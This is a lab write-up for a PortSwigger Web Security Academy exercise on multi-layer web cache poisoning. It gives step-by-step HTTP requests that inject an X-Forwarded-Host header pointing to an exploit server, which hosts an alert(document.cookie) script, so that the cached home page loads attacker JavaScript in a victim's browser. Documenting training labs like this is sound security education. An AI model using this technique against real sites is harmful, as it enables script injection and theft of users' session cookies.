
# #PortSwigger 


![[Pasted image 20260616124225.png]]


## Lab Description

This lab is vulnerable to web cache poisoning using multiple layers of caching. A user regularly visits this site's home page using Chrome.

**Objective:** Poison the internal cache so that the home page executes `alert(document.cookie)` in the victim's browser.

---
---

### Step 1: Identify the Cache Oracle

Send the `GET /` request to Burp Repeater.

**Request:**
```
GET / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

![[Pasted image 20260616124418.png]]

**Observation:** Any changes to the query string are reflected in the response, indicating the external cache includes it in the cache key.

---

### Step 2: Add a Cache Buster

Use Param Miner or manually add a dynamic query parameter to bypass the external cache:
```
GET /?cb=123 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

This ensures you always get a fresh response from the backend.

---

### Step 3: Test X-Forwarded-Host Support

Add the `X-Forwarded-Host` header pointing to your exploit server:
```
GET /?cb=123 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

![[Pasted image 20260616124611.png]]

**Observed behavior:**
- The exploit server URL is reflected in multiple places in the response:
    - Canonical link element
    - `analytics.js` import
    - `geolocate.js` import

---

### Step 5: Create the Malicious Payload

Go to the exploit server and create a file at `/js/geolocate.js`:
```
alert(document.cookie)
```

![[Pasted image 20260616124823.png]]

**Store the exploit.**

---

### Step 6: Poison the Internal Cache

Back in Burp Repeater:
1. **Remove** the dynamic cache buster (`?cb=123`)
2. **Keep** the `X-Forwarded-Host` header pointing to your exploit server

**Request:**
```
GET / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

![[Pasted image 20260616125055.png]]

**Send repeatedly** until all three dynamic URLs in the response point to your exploit server:
- Canonical link: `https://EXPLOIT-SERVER/...`
- `analytics.js`: `https://EXPLOIT-SERVER/js/analytics.js`
- `geolocate.js`: `https://EXPLOIT-SERVER/js/geolocate.js`

---

### Step 7: Keep the Cache Poisoned

Continue replaying the request periodically to keep the cache poisoned until the victim visits the home page.

![[Pasted image 20260616125001.png]]

---

### Step 8: Lab Solved

When the victim visits the home page, `alert(document.cookie)` executes, and the lab is solved.

![[Pasted image 20260616125021.png]]

---
---
